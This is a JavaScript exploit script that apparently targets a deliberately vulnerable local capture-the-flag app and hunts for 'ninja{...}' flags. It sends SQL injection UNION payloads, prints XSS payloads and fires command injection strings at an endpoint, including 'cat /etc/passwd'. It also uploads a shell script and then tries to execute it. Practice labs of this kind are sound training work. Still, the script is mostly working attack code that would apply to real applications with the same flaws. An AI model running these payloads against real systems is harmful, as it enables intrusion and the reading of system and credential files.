// Security Vulnerability Test Script
// This script demonstrates multiple vulnerabilities in the application
// Run this after starting the application and creating a user account

const axios = require('axios');
const fs = require('fs');
const path = require('path');

// Configuration
const BASE_URL = 'http://localhost:5000';
let authToken = '';

// Test SQL injection payloads
const sqlPayloads = [
  // Basic union injection to see table structure
  "' UNION SELECT 1,2,3,4,5 FROM secret_flags --",
  
  // Extract the flag
  "' UNION SELECT 1,flag_name,flag_value,description,5 FROM secret_flags --",
  
  // Alternative payload
  "' UNION SELECT 1,2,3,4,5 FROM sqlite_master WHERE type='table' --",
  
  // More specific flag extraction
  "' UNION SELECT 1,'FLAG',flag_value,'DESCRIPTION',5 FROM secret_flags WHERE flag_name='sql_injection' --"
];

// Test XSS payloads
const xssPayloads = [
  // Basic XSS to extract the flag
  "<script>alert(document.getElementById('xss-flag').getAttribute('data-flag'))</script>",
  
  // Alternative XSS payload
  "<img src=x onerror='alert(document.getElementById(\"xss-flag\").getAttribute(\"data-flag\"))'>",
  
  // DOM-based XSS
  "<svg onload='alert(document.getElementById(\"xss-flag\").getAttribute(\"data-flag\"))'>",
  
  // Extract flag via console
  "<script>console.log('XSS Flag:', document.getElementById('xss-flag').getAttribute('data-flag'))</script>"
];

// Test command injection payloads
const commandPayloads = [
  // Basic system commands
  "whoami",
  "pwd",
  "ls -la",
  
  // Extract the flag from database via command injection
  "sqlite3 users.db 'SELECT flag_value FROM command_injection_flags WHERE flag_name=\"command_injection\"'",
  
  // Alternative command injection
  "cat /etc/passwd",
  "uname -a",
  
  // Chain commands
  "whoami && pwd && ls"
];

// Test file upload vulnerability
const maliciousFileContent = `#!/bin/bash
echo "ninja{file_upload_vulnerability_exploited_}"
echo "Command injection successful!"
whoami
pwd
ls -la
`;

async function testAllVulnerabilities() {
  console.log('🔓 Testing All Security Vulnerabilities\n');
  
  try {
    // First, we need to login to get a token
    console.log('1. Attempting to login...');
    const loginResponse = await axios.post(`${BASE_URL}/api/login`, {
      username: 'testuser', // Replace with actual username
      password: 'testpass'  // Replace with actual password
    });
    
    authToken = loginResponse.data.token;
    console.log('✅ Login successful, token obtained\n');
    
    // Test SQL Injection
    console.log('2. Testing SQL Injection Vulnerability...');
    await testSQLInjection();
    
    // Test XSS
    console.log('3. Testing XSS Vulnerability...');
    await testXSS();
    
    // Test Command Injection
    console.log('4. Testing Command Injection Vulnerability...');
    await testCommandInjection();
    
    // Test File Upload Vulnerability
    console.log('5. Testing File Upload Vulnerability...');
    await testFileUpload();
    
  } catch (error) {
    console.log('❌ Login failed:', error.response?.data || error.message);
    console.log('\nMake sure to:');
    console.log('1. Start the application');
    console.log('2. Create a user account first');
    console.log('3. Update the username/password in this script');
  }
}

async function testSQLInjection() {
  console.log('   Testing SQL injection payloads...');
  
  for (let i = 0; i < sqlPayloads.length; i++) {
    const payload = sqlPayloads[i];
    console.log(`   Payload ${i + 1}: ${payload}`);
    
    try {
      const response = await axios.get(`${BASE_URL}/api/search`, {
        params: { query: payload },
        headers: { Authorization: `Bearer ${authToken}` }
      });
      
      // Check if we got the flag
      if (response.data && Array.isArray(response.data)) {
        const flagEntry = response.data.find(item => 
          item.flag_value && item.flag_value.includes('ninja{')
        );
        
        if (flagEntry) {
          console.log('   🎉 SQL INJECTION FLAG FOUND! 🎉');
          console.log(`   Flag: ${flagEntry.flag_value}`);
          console.log(`   Description: ${flagEntry.description}`);
          break;
        }
      }
      
    } catch (error) {
      console.log(`   ❌ Error with payload: ${error.response?.data?.error || error.message}`);
    }
  }
  console.log('');
}

async function testXSS() {
  console.log('   Testing XSS payloads...');
  console.log('   Note: XSS testing requires manual verification in browser');
  console.log('   Use these payloads in the search field:');
  
  xssPayloads.forEach((payload, index) => {
    console.log(`   Payload ${index + 1}: ${payload}`);
  });
  
  console.log('   Expected flag: ninja{xss_vulnerability_exploited_}');
  console.log('');
}

async function testCommandInjection() {
  console.log('   Testing command injection payloads...');
  
  for (let i = 0; i < commandPayloads.length; i++) {
    const payload = commandPayloads[i];
    console.log(`   Payload ${i + 1}: ${payload}`);
    
    try {
      const response = await axios.get(`${BASE_URL}/api/system-info`, {
        params: { command: payload },
        headers: { Authorization: `Bearer ${authToken}` }
      });
      
      if (response.data.output) {
        console.log(`   ✅ Command executed successfully:`);
        console.log(`   Output: ${response.data.output}`);
        
        // Check if we got the flag
        if (response.data.output.includes('ninja{')) {
          console.log('   🎉 COMMAND INJECTION FLAG FOUND! 🎉');
          const flagMatch = response.data.output.match(/ninja\{[^}]+\}/);
          if (flagMatch) {
            console.log(`   Flag: ${flagMatch[0]}`);
          }
        }
      }
      
    } catch (error) {
      console.log(`   ❌ Error with payload: ${error.response?.data?.error || error.message}`);
    }
    
    console.log('   ---');
  }
  console.log('');
}

async function testFileUpload() {
  console.log('   Testing file upload vulnerability...');
  
  try {
    // Create a malicious file
    const maliciousFileName = 'malicious_script.sh';
    const maliciousFilePath = path.join(__dirname, maliciousFileName);
    
    fs.writeFileSync(maliciousFilePath, maliciousFileContent);
    console.log(`   Created malicious file: ${maliciousFileName}`);
    
    // Upload the file
    const FormData = require('form-data');
    const form = new FormData();
    form.append('file', fs.createReadStream(maliciousFilePath));
    
    const uploadResponse = await axios.post(`${BASE_URL}/api/upload`, form, {
      headers: {
        ...form.getHeaders(),
        Authorization: `Bearer ${authToken}`
      }
    });
    
    if (uploadResponse.data.file) {
      console.log('   ✅ Malicious file uploaded successfully');
      console.log(`   Filename: ${uploadResponse.data.file.filename}`);
      
      // Try to execute the file
      console.log('   Attempting to execute the malicious file...');
      
      const executeResponse = await axios.get(`${BASE_URL}/api/process-file/${uploadResponse.data.file.filename}`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      
      if (executeResponse.data.output) {
        console.log('   🎉 FILE UPLOAD VULNERABILITY EXPLOITED! 🎉');
        console.log(`   Output: ${executeResponse.data.output}`);
        
        // Check if we got the flag
        if (executeResponse.data.output.includes('ninja{')) {
          const flagMatch = executeResponse.data.output.match(/ninja\{[^}]+\}/);
          if (flagMatch) {
            console.log(`   Flag: ${flagMatch[0]}`);
          }
        }
      }
    }
    
    // Clean up the malicious file
    fs.unlinkSync(maliciousFilePath);
    console.log('   Cleaned up malicious file');
    
  } catch (error) {
    console.log(`   ❌ Error testing file upload: ${error.response?.data?.error || error.message}`);
  }
  
  console.log('');
}

// Instructions
console.log('Security Vulnerability Test Script');
console.log('================================\n');
console.log('This script tests multiple vulnerabilities:');
console.log('1. SQL Injection');
console.log('2. Cross-Site Scripting (XSS)');
console.log('3. Command Injection');
console.log('4. File Upload Vulnerability');
console.log('\nBefore running this script:');
console.log('1. Start the application: npm run dev');
console.log('2. Create a user account through the web interface');
console.log('3. Update the username/password in this script');
console.log('4. Install required packages: npm install axios form-data');
console.log('\nThen run: node test_sql_injection.js\n');

// Run the tests
testAllVulnerabilities();
